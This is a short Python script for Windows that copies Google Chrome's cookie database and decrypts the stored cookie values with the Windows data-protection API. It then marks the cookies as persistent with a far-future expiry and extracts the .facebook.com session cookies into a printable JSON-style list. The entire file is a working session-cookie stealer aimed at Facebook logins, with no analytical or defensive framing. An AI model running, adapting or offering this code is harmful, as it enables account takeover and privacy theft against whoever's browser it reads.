#Based off https://gist.github.com/DakuTree/98c8362fb424351b803e & pieces of https://gist.github.com/jordan-wright/5770442
from os import getenv
from shutil import copyfile
import sqlite3
import win32crypt #https://sourceforge.net/projects/pywin32/
print("aa")






# Copy Cookies to current folder
copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", './Cookies')

# Connect to the Database
conn = sqlite3.connect('./Cookies')
cursor = conn.cursor()

# Get the results
cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')

list_cookies = []
id =0 
 
for host_key, name, path, encrypted_value in cursor.fetchall():
    # Decrypt the encrypted_value
     
    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or path or 0
     
    cursor.execute('\
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1\
        WHERE host_key = ?\
        AND name = ?',
        (decrypted_value, host_key, name));
     
     
     
     
     
    dict_child = {}
    if(host_key == ".facebook.com"):
        dict_child["domain"] = host_key
        dict_child["name"]=name
        dict_child["value"] = decrypted_value
         
        id += 1
        dict_child["path"] = path #bắt buột có path
        dict_child["id"] =id.__str__()
        print(host_key)
        print(name)
        print (decrypted_value)
         
        list_cookies.append(dict_child)
 
str_cookies_format = list_cookies.__str__().replace('\'','\"')
print("format cookies")
print(str_cookies_format)